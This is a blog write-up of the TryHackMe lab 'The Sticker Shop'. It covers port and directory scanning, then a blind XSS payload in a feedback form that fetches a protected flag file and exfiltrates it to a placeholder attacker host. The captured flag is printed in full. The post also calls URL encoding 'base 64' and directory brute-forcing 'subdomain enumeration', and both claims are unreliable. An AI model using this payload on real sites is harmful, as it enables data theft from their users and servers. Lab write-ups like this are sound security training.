---
title: "The Sticker Shop"
date: 2024-12-1 12:00:00 +0000
categories: [CTF, Tryhackme]
tags: [Writeup, Cybersecurity, Tryhackme]
pin: true
---

![Screenshot](/assets/img/stickers-shop/0.png)

Can you exploit the sticker shop in order to capture the flag?

**The sticker shop is finally online!**

Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!

Can you read the flag at `http://your-target-ipaddress:8080/flag.txt`?

![Screenshot](/assets/img/stickers-shop/1.png)

let's scan our target first to take a look at the open ports..

```bash
nmap -sV -p- 10.10.199.200
```

![Screenshot](/assets/img/stickers-shop/6.png)

just the 8080 port

and let's check if there any hints in the header using `curl` tool :

```bash
curl -I http://10.10.199.200:8080/flag.txt
```

![Screenshot](/assets/img/stickers-shop/2.png)

The response indicates that the server is using Werkzeug (a Python-based web framework) and is returning a 401 Unauthorized status.

there is our target :

![Screenshot](/assets/img/stickers-shop/4.png)

we have two links in the nav bar let's check them..

the Home page is normal and doesn't look like it has anything interesting..

so, let's check the feedback page..!

![Screenshot](/assets/img/stickers-shop/5.png)

The page allows users to enter feedback, and after some testing, I found that this page is vulnerable to Blind XSS.

If we tried to access the `http://your-target-ipaddress:8080/flag.txt` directly we will get this message -> **401 Unauthorized**

I made a subdomain enumeration to see if there any hidden paths  using `gobuster` tool..

```bash
gobuster dir -u http://your-target-ipaddress:8080/ -w /usr/share/wordlists/dirb/common.txt
```

but I found nothing except the /flag.txt that we already know it.

![Screenshot](/assets/img/stickers-shop/3.png)

So as a penetration tester who has studied the XSS Types..I know that the blind XSS Type won't give you or won't show you the response directly like the Normal XSS,
So what am gonna do right now is..

**1. Setting Up a Local Server:**

```bash
python3 -m http.server 8000
```

To capture data exfiltrated through Blind XSS, start a simple HTTP server on our local machine:

This will run a web server on port 8000 and allow us to receive HTTP requests containing the exfiltrated flag.

**2. Crafting the Payload:**
I crafted a Blind XSS payload that reads the contents of flag.txt on the server and sends it to My local server:

```js
"><script>
  fetch('http://127.0.0.1:8080/flag.txt')
    .then(response => response.text())
    .then(data => {
      fetch('http://<YOUR-IP-ADDRESS>:8000/?flag=' + encodeURIComponent(data));
    });
</script>
```

**Explanation:**

The payload triggers a fetch() request to retrieve the contents of flag.txt from the server.
Once fetched, it exfiltrates the data by sending a new request to our local server `(<our-IP-ADDRESS>:8000)`, appending the flag as a query parameter.

**3. Executing the Exploit:**
Submit the payload in the feedback form at `http://our-target-ipaddress:8080/submit_feedback`.
Monitor your local server’s terminal output for an incoming request containing the flag in the URL.

Let's do it..

![Screenshot](/assets/img/stickers-shop/7.png)

here is the payload..

then we will set up the local server..

![Screenshot](/assets/img/stickers-shop/8.png)

and let's post our payload in the submit form..!

![Screenshot](/assets/img/stickers-shop/9.png)

```bash
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.247.239 - - [01/Dec/2024 22:30:35] "GET /?flag=THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D HTTP/1.1" 200 -
```

so there is the flag :

```c
flag=THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D
```

but it's base 64 encoded, so let's use our terminal to decode it using this command:

```bash
echo "THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D" | python3 -c "import sys, urllib.parse; print(urllib.parse.unquote(sys.stdin.read().strip()))"

THM{83789a69074f636f64a38879cfcabe8b62305ee6}
```

and finally we've got the flag !

![Screenshot](/assets/img/stickers-shop/11.png)

and guess what!

![Screenshot](/assets/img/stickers-shop/10.png)

yea bro we did it, see u in the next writeup `:)`











